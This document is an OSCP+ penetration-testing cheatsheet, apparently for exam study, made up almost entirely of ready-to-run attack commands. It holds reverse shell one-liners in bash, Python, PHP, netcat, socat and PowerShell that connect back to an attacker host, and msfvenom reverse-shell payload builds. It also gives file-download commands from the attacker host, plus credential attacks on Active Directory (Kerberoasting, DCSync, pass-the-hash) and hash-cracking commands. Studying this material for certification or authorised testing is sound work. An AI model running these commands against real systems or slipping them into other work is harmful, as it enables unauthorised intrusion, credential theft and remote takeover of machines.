# OSCP+ Quick Reference Cheatsheet

## Initial Recon Flow

```bash
# 1. Full port scan
nmap -p- --min-rate=1000 -T4 $TARGET_IP -oN nmap/ports.txt

# 2. Service enumeration on open ports
nmap -p $(cat nmap/ports.txt | grep open | cut -d/ -f1 | tr '\n' ',') -sC -sV -T4 $TARGET_IP -oA nmap/detailed

# 3. Web recon (if HTTP is open)
gobuster dir -u http://$TARGET_IP -w /usr/share/seclists/Discovery/Web-Content/common.txt -t 50 -x php,html,txt
whatweb http://$TARGET_IP

# 4. SMB check (if port 445 is open)
crackmapexec smb $TARGET_IP -u '' -p '' --shares
enum4linux-ng -A $TARGET_IP
smbmap -H $TARGET_IP

# 5. Run vulnerability scan
nmap --script vuln -p $(cat nmap/ports.txt | grep open | cut -d/ -f1 | tr '\n' ',') $TARGET_IP
```

---

## Reverse Shell One-Liners

### Linux
```bash
# Bash
bash -i >& /dev/tcp/$ATTACK_IP/4444 0>&1

# Python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$ATTACK_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'

# PHP
php -r '$s=fsockopen("$ATTACK_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Netcat
nc -e /bin/sh $ATTACK_IP 4444

# Socat (upgraded shell)
socat exec:'bash -i',pty,stderr,setsid,sigint,sane tcp:$ATTACK_IP:4444
```

### Windows
```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "New-Object System.Net.Sockets.TCPClient('$ATTACK_IP',4444);$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{0};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne 0){;$data=([Text.Encoding]::ASCII).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+'PS '+(pwd).Path+'> ';$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

---

## Privilege Escalation - Quick Checks

### Linux Privesc
```bash
sudo -l                                            # Sudo permissions
find / -perm -4000 -type f 2>/dev/null             # SUID binaries
cat /etc/crontab                                    # Cron jobs
getcap -r / 2>/dev/null                            # Capabilities
ls -la /etc/passwd /etc/shadow                     # Permissions
find / -writable -type f 2>/dev/null | grep -v proc # Writable files
ps aux | grep root                                  # Running processes
cat /proc/1/cgroup | grep docker                   # Docker check
```

### Windows Privesc
```cmd
whoami /priv                                        # Token privileges
systeminfo                                          # OS version
wmic service get name,displayname,pathname,startmode  # Services
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall  # Installed software
netstat -ano                                        # Open ports
tasklist /SVC                                       # Running services
cmdkey /list                                        # Stored creds
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated  # MSI install
```

---

## Active Directory Quick Reference

### Enumeration
```bash
crackmapexec smb $TARGET_IP -u 'user' -p 'pass' --users --groups --shares
bloodhound-python -u user -p pass -d $DOMAIN -ns $DC_IP -c all
ldapsearch -x -H ldap://$DC_IP -b "dc=$DOMAIN,dc=local"
```

### Attacks
```bash
# Kerberoasting
impacket-GetUserSPNs $DOMAIN/user:pass@$DC_IP -request

# AS-REP Roasting
impacket-GetNPUsers $DOMAIN/ -dc-ip $DC_IP -no-pass

# DCSync (needs DA)
impacket-secretsdump $DOMAIN/admin:pass@$DC_IP

# Pass-the-Hash
impacket-wmiexec $DOMAIN/user@$TARGET_IP -hashes :NTHASH

# ADCS
certipy find -u user@$DOMAIN -p password -dc-ip $DC_IP
```

---

## File Transfer Quick Reference

### Linux Targets
```bash
wget http://$ATTACK_IP/file
curl -O http://$ATTACK_IP/file
python3 -c "import urllib.request;urllib.request.urlretrieve('http://$ATTACK_IP/file','file')"
exec 3<>/dev/tcp/$ATTACK_IP/80; echo -e "GET /file HTTP/1.1\n\n" >&3; cat <&3
```

### Windows Targets
```powershell
iwr -Uri http://$ATTACK_IP/file -OutFile file
(New-Object Net.WebClient).DownloadFile('http://$ATTACK_IP/file','file')
certutil -urlcache -f http://$ATTACK_IP/file file
```

### Serve Files
```bash
python3 -m http.server 80
impacket-smbserver share . -smb2support   # SMB share in current dir
```

---

## Password Cracking Reference

### Common Hash Modes
| Hash | Mode | Typical Usage |
|---|---|---|
| MD5 | 0 | Linux web DBs |
| SHA1 | 100 | Old systems |
| NTLM | 1000 | Windows SAM |
| NetNTLMv2 | 5600 | SMB capture |
| bcrypt | 3200 | Modern Linux shadow |
| SHA512crypt | 1800 | Linux shadow ($6$) |
| Kerberos TGS | 13100 | Kerberoast |
| AS-REP | 18200 | AS-REP roast |
| WPA2 | 2500 | WiFi handshake |

```bash
hashcat -m <mode> hashes.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m <mode> hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-3000.rule --force
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

---

## Payload Generation
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$ATTACK_IP LPORT=4444 -f elf -o shell.elf
msfvenom -p windows/shell_reverse_tcp LHOST=$ATTACK_IP LPORT=4444 -f exe -o shell.exe
msfvenom -p php/reverse_php LHOST=$ATTACK_IP LPORT=4444 -f raw -o shell.php
msfvenom -p windows/shell_reverse_tcp LHOST=$ATTACK_IP LPORT=4444 -f aspx -o shell.aspx
msfvenom -p python/shell_reverse_tcp LHOST=$ATTACK_IP LPORT=4444 -o shell.py
```

---

## Shell Upgrade (TTY)
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z to background
stty raw -echo; fg
reset
export TERM=xterm
```

---

## Pivoting Quick Setup
```bash
# SSH SOCKS proxy
ssh -D 1080 user@pivot_ip

# Chisel (fast TCP tunnel)
# Server: chisel server -p 8000 --reverse
# Client: chisel client $ATTACK_IP:8000 R:1080:socks

# Then use: proxychains <command>
```
